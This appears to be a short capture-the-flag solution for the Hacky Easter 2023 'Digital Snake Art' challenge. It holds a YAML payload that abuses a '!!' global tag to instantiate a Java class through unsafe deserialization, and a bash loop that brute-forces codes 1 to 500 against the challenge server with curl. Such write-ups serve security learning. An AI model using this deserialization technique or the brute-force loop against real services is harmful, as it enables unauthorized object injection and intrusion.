# [HE2023] Digital Snake Art

```yaml
name: Snake and Rabbit Being Friends
image: !!com.hackyeaster.digitalsnakeart.Flag [CODE]
source: DALL-E
resolution: 256x256
```

```bash
#!/bin/bash -e

for i in {1..500}
do
  URL="http://ch.hackyeaster.com:2307/art?art="$(cat payload.raw | sed s/CODE/$i/ | base64 -w 0)
  OUTPUT=$(curl -s $URL)
  if grep -q "WdXKXcbIl9f03mIM2dLG2CRvHicCKOC7DqAAbpMu5dMAeGsaAFiHV24BmplqL5QNcU2CDAOi" <<< "$OUTPUT"; then
    echo "$i: fail"
  else
    echo "$i: FOUND!!!"
  fi
done
```
